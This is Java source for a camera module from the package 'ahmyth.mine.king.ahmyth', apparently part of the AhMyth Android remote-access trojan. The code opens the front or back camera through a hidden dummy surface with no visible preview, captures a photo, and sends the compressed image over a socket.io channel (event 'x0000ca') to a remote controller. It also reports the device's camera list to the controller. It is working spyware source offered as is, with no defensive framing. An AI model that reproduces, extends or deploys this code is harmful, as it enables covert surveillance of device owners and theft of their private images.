package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class CameraManager {

    private static final String TAG = "CameraManager";
    private Context context;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    
    // Camera2 API
    private android.hardware.camera2.CameraManager camera2Manager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private String currentCameraId;

    public CameraManager(Context context) {
        this.context = context;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            camera2Manager = (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        }
    }

    public void startUp(int cameraID) {
        Log.d(TAG, "startUp called with cameraID: " + cameraID);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            startCamera2(cameraID);
        } else {
            startLegacyCamera(cameraID);
        }
    }
    
    private void startCamera2(int cameraID) {
        try {
            startBackgroundThread();
            
            String[] cameraIds = camera2Manager.getCameraIdList();
            if (cameraID >= cameraIds.length) {
                sendError("Invalid camera ID: " + cameraID);
                return;
            }
            
            currentCameraId = cameraIds[cameraID];
            Log.d(TAG, "Opening camera2: " + currentCameraId);
            
            CameraCharacteristics characteristics = camera2Manager.getCameraCharacteristics(currentCameraId);
            
            Size[] jpegSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    .getOutputSizes(ImageFormat.JPEG);
            
            Size optimalSize = getOptimalSize(jpegSizes);
            int width = optimalSize != null ? optimalSize.getWidth() : 1280;
            int height = optimalSize != null ? optimalSize.getHeight() : 720;
            
            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            sendPhoto(bytes);
                        }
                    } finally {
                        if (image != null) {
                            image.close();
                        }
                        closeCamera();
                    }
                }
            }, backgroundHandler);
            
            camera2Manager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    Log.d(TAG, "Camera2 opened");
                    cameraDevice = camera;
                    createCaptureSession();
                }

                @Override
                public void onDisconnected(CameraDevice camera) {
                    Log.d(TAG, "Camera2 disconnected");
                    closeCamera();
                }

                @Override
                public void onError(CameraDevice camera, int error) {
                    Log.e(TAG, "Camera2 error: " + error);
                    closeCamera();
                    sendError("Camera error code: " + error);
                }
            }, backgroundHandler);
            
        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera access exception", e);
            sendError("Camera access denied: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception", e);
            sendError("Camera permission denied");
        } catch (Exception e) {
            Log.e(TAG, "Error starting camera2", e);
            sendError("Camera error: " + e.getMessage());
        }
    }
    
    private void createCaptureSession() {
        try {
            if (cameraDevice == null) return;
            
            cameraDevice.createCaptureSession(
                    Arrays.asList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(CameraCaptureSession session) {
                            Log.d(TAG, "Capture session configured");
                            captureSession = session;
                            backgroundHandler.postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    captureStillPicture();
                                }
                            }, 500);
                        }

                        @Override
                        public void onConfigureFailed(CameraCaptureSession session) {
                            Log.e(TAG, "Capture session configuration failed");
                            sendError("Failed to configure camera session");
                            closeCamera();
                        }
                    },
                    backgroundHandler
            );
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating capture session", e);
            sendError("Camera session error: " + e.getMessage());
        }
    }
    
    private void captureStillPicture() {
        try {
            if (cameraDevice == null || captureSession == null) return;
            
            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());
            
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO);
            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
            captureBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
            
            captureSession.capture(captureBuilder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(CameraCaptureSession session,
                                               CaptureRequest request,
                                               TotalCaptureResult result) {
                    Log.d(TAG, "Capture completed");
                }
            }, backgroundHandler);
            
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error capturing picture", e);
            sendError("Capture error: " + e.getMessage());
        }
    }
    
    private Size getOptimalSize(Size[] sizes) {
        if (sizes == null || sizes.length == 0) return null;
        
        Size optimal = sizes[0];
        for (Size size : sizes) {
            if (size.getWidth() <= 1920 && size.getHeight() <= 1080) {
                if (size.getWidth() * size.getHeight() > optimal.getWidth() * optimal.getHeight()) {
                    optimal = size;
                }
            }
        }
        return optimal;
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }
    
    private void closeCamera() {
        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            stopBackgroundThread();
        } catch (Exception e) {
            Log.e(TAG, "Error closing camera", e);
        }
    }
    
    // Legacy Camera API fallback
    private void startLegacyCamera(int cameraID) {
        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                android.hardware.Camera camera = null;
                try {
                    Log.d(TAG, "Opening legacy camera " + cameraID);
                    camera = android.hardware.Camera.open(cameraID);
                    
                    if (camera == null) {
                        sendError("Failed to open camera");
                        return;
                    }
                    
                    final android.hardware.Camera finalCamera = camera;
                    android.hardware.Camera.Parameters parameters = camera.getParameters();
                    camera.setParameters(parameters);
                    
                    try {
                        camera.setPreviewTexture(new SurfaceTexture(0));
                        camera.startPreview();
                    } catch (Exception e) {
                        Log.e(TAG, "Error starting preview", e);
                    }
                    
                    mainHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                finalCamera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
                                    @Override
                                    public void onPictureTaken(byte[] data, android.hardware.Camera cam) {
                                        releaseCamera(finalCamera);
                                        if (data != null && data.length > 0) {
                                            sendPhoto(data);
                                        } else {
                                            sendError("No image data received");
                                        }
                                    }
                                });
                            } catch (Exception e) {
                                releaseCamera(finalCamera);
                                sendError("Error taking picture: " + e.getMessage());
                            }
                        }
                    }, 500);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error in legacy camera", e);
                    if (camera != null) releaseCamera(camera);
                    sendError("Camera error: " + e.getMessage());
                }
            }
        });
    }
    
    private void releaseCamera(android.hardware.Camera camera) {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
        }
    }
    
    private void sendError(String message) {
        try {
            JSONObject object = new JSONObject();
            object.put("image", false);
            object.put("error", message);
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
        } catch (Exception e) {
            Log.e(TAG, "Error sending error message", e);
        }
    }

    private void sendPhoto(byte[] data) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            if (bitmap == null) {
                sendError("Failed to decode image");
                return;
            }
            
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos);
            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", bos.toByteArray());
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
            Log.d(TAG, "Photo sent, size: " + bos.size());
        } catch (JSONException e) {
            Log.e(TAG, "Error sending photo", e);
            sendError("Error processing image");
        }
    }

    public JSONObject findCameraList() {
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)) {
            return null;
        }

        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && camera2Manager != null) {
                String[] cameraIds = camera2Manager.getCameraIdList();
                for (int i = 0; i < cameraIds.length; i++) {
                    CameraCharacteristics characteristics = camera2Manager.getCameraCharacteristics(cameraIds[i]);
                    Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                    
                    JSONObject jo = new JSONObject();
                    jo.put("id", i);
                    if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        jo.put("name", "Front");
                    } else if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        jo.put("name", "Back");
                    } else {
                        jo.put("name", "External");
                    }
                    list.put(jo);
                }
            } else {
                int numberOfCameras = android.hardware.Camera.getNumberOfCameras();
                for (int i = 0; i < numberOfCameras; i++) {
                    android.hardware.Camera.CameraInfo info = new android.hardware.Camera.CameraInfo();
                    android.hardware.Camera.getCameraInfo(i, info);
                    
                    JSONObject jo = new JSONObject();
                    jo.put("id", i);
                    if (info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        jo.put("name", "Front");
                    } else {
                        jo.put("name", "Back");
                    }
                    list.put(jo);
                }
            }

            cameras.put("list", list);
            return cameras;

        } catch (Exception e) {
            Log.e(TAG, "Error finding cameras", e);
        }

        return null;
    }
}
